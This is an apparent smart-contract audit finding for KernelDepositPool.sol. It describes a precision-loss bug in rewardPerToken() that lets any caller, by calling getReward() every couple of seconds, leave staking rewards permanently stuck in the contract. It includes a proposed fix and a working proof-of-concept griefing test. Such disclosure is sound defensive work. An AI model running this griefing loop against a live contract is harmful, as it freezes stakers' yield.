### Title
Precision loss in `rewardPerToken()` enables griefing attack causing permanent freezing of unclaimed yield - (File: contracts/KERNEL/KernelDepositPool.sol)

### Summary
`KernelDepositPool.sol` contains the same precision-loss vulnerability class as the referenced report. The `rewardPerToken()` function performs integer division that silently discards the remainder. Because the `updateReward` modifier always advances `updatedAt` even when `rewardPerTokenStored` is unchanged, an attacker can permissionlessly call `getReward()` at short intervals to cause the full reward amount for each interval to be permanently stuck in the contract.

### Finding Description

`rewardPerToken()` computes the incremental reward per token as:

```
rewardPerTokenStored + (rewardRate * (lastTimeRewardApplicable() - updatedAt) * DECIMAL_PRECISION) / totalKernelStaked
``` [1](#0-0) 

The integer division discards the residual `rewardRate * dt * 1e18 % totalKernelStaked`. The `updateReward` modifier then unconditionally writes the (potentially unchanged) `rewardPerTokenStored` back and advances `updatedAt` to the current time: [2](#0-1) 

When the condition `rewardRate * dt * DECIMAL_PRECISION < totalKernelStaked` holds, `rewardPerTokenStored` stays exactly the same while `updatedAt` is bumped forward by `dt` seconds. All rewards that accrued during `dt` are permanently unaccounted for and remain locked in the contract.

The permissionless entry point is `getReward()`: [3](#0-2) 

Any external caller can invoke `getReward()` at will, triggering `updateReward` and consuming a time slice without advancing `rewardPerTokenStored`. `stake()` is equally permissionless and has the same effect: [4](#0-3) 

### Impact Explanation

**Medium — Permanent freezing of unclaimed yield.**

Two distinct sub-impacts exist:

1. **Continuous accumulation**: On every `updateReward` invocation the residual `rewardRate * dt * 1e18 % totalKernelStaked` is silently discarded. These amounts accumulate over the entire reward duration and are irrecoverable.

2. **Full griefing**: When `rewardRate * dt * 1e18 < totalKernelStaked`, the entire reward for interval `dt` is lost. An attacker who calls `getReward()` once per block for the full `duration` can cause 100% of the distributed rewards to remain permanently stuck in the contract, with all stakers earning zero.

### Likelihood Explanation

**Medium.** The continuous precision loss occurs on every `updateReward` call regardless of conditions — it is always present. The full griefing attack requires `totalKernelStaked > rewardRate * 1e18`, which is realistic: with `totalKernelStaked = 21e18` (21 KERNEL) and `rewardRate = 10` (raw tokens/sec), `dt = 2` seconds satisfies the condition, and Ethereum's ~12-second block time makes per-block griefing feasible. Higher staking amounts or lower reward rates make the attack easier.

### Recommendation

Store the residual from each `rewardPerToken()` computation and carry it forward into the next invocation, preventing it from being silently discarded:

```solidity
uint256 public rewardResidue; // new state variable

function rewardPerToken() public view returns (uint256) {
    if (totalKernelStaked == 0) return rewardPerTokenStored;
    uint256 numerator = rewardRate * (lastTimeRewardApplicable() - updatedAt) * DECIMAL_PRECISION + rewardResidue;
    return rewardPerTokenStored + numerator / totalKernelStaked;
}

modifier updateReward(address _account) {
    uint256 numerator = rewardRate * (lastTimeRewardApplicable() - updatedAt) * DECIMAL_PRECISION + rewardResidue;
    rewardPerTokenStored = rewardPerTokenStored + (totalKernelStaked > 0 ? numerator / totalKernelStaked : 0);
    rewardResidue = totalKernelStaked > 0 ? numerator % totalKernelStaked : rewardResidue;
    updatedAt = lastTimeRewardApplicable();
    ...
}
```

### Proof of Concept

The following test demonstrates 100% reward loss via the griefing path, adapted directly to `KernelDepositPool`:

```solidity
function test_rewardPerTokenStored_KernelDepositPool() public {
    address user1 = address(0xa11ce);
    uint256 rewardDuration = 1 hours;
    uint256 stakingAmount = 21 ether;          // totalKernelStaked = 21e18
    uint256 rewardRate    = 10;                // raw tokens/sec
    uint256 rewardAmount  = rewardRate * rewardDuration;

    // user1 stakes
    vm.startPrank(user1);
    kernelToken.mint(user1, stakingAmount);
    kernelToken.approve(address(pool), stakingAmount);
    pool.stake(stakingAmount);
    vm.stopPrank();

    // admin notifies reward
    rewardsToken.mint(address(this), rewardAmount);
    rewardsToken.approve(address(pool), rewardAmount);
    pool.notifyRewardAmount(rewardAmount);

    // dt = totalKernelStaked / (rewardRate * 1e18) = 21e18 / (10 * 1e18) = 2
    // condition: rewardRate * dt * 1e18 = 10 * 2 * 1e18 = 20e18 < 21e18 = totalKernelStaked ✓
    uint256 dt = stakingAmount / (rewardRate * 1e18); // = 2 seconds

    uint256 nSkips = rewardDuration / dt;
    for (uint256 i; i < nSkips; i++) {
        skip(dt);
        pool.getReward(); // permissionless; triggers updateReward, advances updatedAt, rewardPerTokenStored unchanged
    }

    // rewardPerTokenStored never increased; user1 earned nothing
    assertEq(pool.rewardPerTokenStored(), 0);
    assertEq(pool.earned(user1, address(rewardsToken)), 0);
    // full rewardAmount is stuck in the contract
    assertEq(rewardsToken.balanceOf(address(pool)), rewardAmount);
}
```

The griefing entry path is: any external caller → `getReward()` → `updateReward(msg.sender)` → `rewardPerToken()` integer division → `rewardPerTokenStored` unchanged, `updatedAt` advanced → rewards for `dt` permanently lost. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** contracts/KERNEL/KernelDepositPool.sol (L232-242)
```text
    modifier updateReward(address _account) {
        rewardPerTokenStored = rewardPerToken();
        updatedAt = lastTimeRewardApplicable();

        if (_account != address(0)) {
            rewards[_account] = earned(_account);
            userRewardPerTokenPaid[_account] = rewardPerTokenStored;
        }

        _;
    }
```

**File:** contracts/KERNEL/KernelDepositPool.sol (L281-289)
```text
    function stake(uint256 _amount) external nonReentrant updateReward(msg.sender) {
        if (_amount == 0) revert AmountZero();

        balanceOf[msg.sender] += _amount;
        totalKernelStaked += _amount;
        kernelToken.safeTransferFrom(msg.sender, address(this), _amount);

        emit Staked(msg.sender, _amount);
    }
```

**File:** contracts/KERNEL/KernelDepositPool.sol (L382-390)
```text
    function getReward() external nonReentrant updateReward(msg.sender) {
        uint256 rewardAmount = rewards[msg.sender];

        if (rewardAmount > 0) {
            rewards[msg.sender] = 0;
            rewardsToken.safeTransfer(msg.sender, rewardAmount);
            emit RewardsClaimed(msg.sender, rewardAmount);
        }
    }
```

**File:** contracts/KERNEL/KernelDepositPool.sol (L408-414)
```text
    function rewardPerToken() public view returns (uint256) {
        if (totalKernelStaked == 0) {
            return rewardPerTokenStored;
        }
        return rewardPerTokenStored + (rewardRate * (lastTimeRewardApplicable() - updatedAt) * DECIMAL_PRECISION)
            / totalKernelStaked;
    }
```
